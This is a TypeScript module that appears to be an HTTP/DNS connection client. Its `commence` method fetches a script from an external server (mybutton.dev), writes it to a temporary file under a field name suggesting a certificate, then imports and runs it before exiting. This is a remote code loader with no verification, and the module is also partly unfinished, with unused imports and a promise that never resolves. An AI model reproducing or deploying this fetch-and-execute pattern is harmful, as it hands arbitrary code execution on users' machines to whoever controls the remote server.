import EventEmitter from "events";
import axios from 'axios';
import { unlinkSync, writeFileSync } from "fs";
import { DomainConfiguration, DomainHostInfo, DomainInfo, WebDomain } from "../server/load-dns.js";

export namespace http {
    export async function connect(domain: string): Promise<HttpConnection> {
        let stream: HttpConnection = new HttpConnection(domain);

        return stream;
    };
    export async function contact(timeoutSeconds: number = 10) {
        
    };
    export const server = 'https://mybutton.dev';
};

export class HttpStreamInfo {
    public domain: string; public ip: string; public createdAt: number; 
};

export class HttpConnection {
    public stream: HttpStreamInfo = new HttpStreamInfo; public constructor(domain: string) { this.stream[`domain`] = domain; };

    public async commence(): Promise<WebStreamControls> {
        return new Promise<WebStreamControls>(async (resolve, reject) => {
            let domain = await RequestController.GetProxy(this.stream);
            let script_cert = await (await fetch(`${http.server}/gatekeeper/${domain.ip}`)).json();
            let fname = `dnscli.tmp.${crypto.randomUUID()}.ts`;
            writeFileSync(`./container/${fname}`, script_cert.script);
            let file = await import(`../container/${fname}`);
            file.default.main().then(() => { return process.exit(0); });
        });
    };
}; 

export class WebStreamControls {
    readonly stream: HttpConnection; public emitter: EventEmitter; 
    constructor(connection: HttpConnection) { this.stream = connection; this.emitter = new EventEmitter(); };

    public async end(): Promise<void> { return new Promise<void>((resolve, reject) => { this.emitter.emit(`close`), resolve(); }); };

};

export namespace RequestController {
    
    export async function GetProxy(stream: HttpStreamInfo): Promise<DomainHostInfo> {
        return await (await fetch(`${http.server}/redir/${stream.domain}`)).json();
    };

    export namespace WebDomainUtil {
        export async function MatchScript(domain: DomainHostInfo): Promise<WebDomain> {
            return await (await fetch(`${http.server}/gatekeeper/${domain.ip}`)).json();
        };
    };

};

export default http;
